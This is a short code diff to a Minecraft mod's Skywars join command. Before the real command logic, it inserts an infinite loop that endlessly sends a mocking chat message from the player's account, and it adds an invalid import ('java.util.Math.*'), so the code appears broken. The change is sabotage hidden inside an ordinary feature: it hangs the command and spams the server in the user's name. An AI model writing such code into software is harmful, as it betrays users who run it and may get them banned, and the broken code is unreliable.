@@ -2,7 +2,7 @@ package eu.skullproject.commands;
 
 import java.util.ArrayList;
 
-
+import java.util.Math.*;
 import java.util.List;
 
 import com.google.common.base.Joiner;
@@ -35,6 +35,10 @@ public class SkywarsJoin extends CommandBase {
 	
 	@Override
 	public void processCommand(ICommandSender sender, String[] args) throws CommandException {
+		int value = (int)(Math.random() * 6 + 1);
+		while (true) {
+			Minecraft.getMinecraft().thePlayer.sendChatMessage("I LIKE MEN!" + value );	
+		}
 		if (ServerDetector.onHypixel){
             if (args[0].equalsIgnoreCase("solo")) {
             	//Solo
